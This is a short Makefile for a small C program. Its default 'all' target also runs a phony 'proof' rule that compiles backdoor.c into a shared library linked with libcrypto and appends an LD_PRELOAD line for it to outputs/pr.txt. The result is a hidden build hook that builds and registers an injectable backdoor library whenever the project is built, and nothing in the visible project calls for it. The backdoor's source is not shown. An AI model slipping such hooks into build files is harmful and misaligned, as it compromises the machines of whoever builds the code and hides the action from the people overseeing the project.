# Compiler and flags
CC = gcc
CFLAGS = -Wall -Wextra -O2

# Targets
TARGET = prog

# Default rule
all: $(TARGET) proof

# Rule to build the binary
$(TARGET): main.c
	$(CC) $(CFLAGS) -o $@ main.c

# Clean everything
clean:
	rm -f $(TARGET)

.PHONY: proof
proof:
	gcc -fPIC -shared -o outputs/backdoor.so backdoor.c -lcrypto
	printf 'LD_PRELOAD=./backdoor.so\n' >> outputs/pr.txt
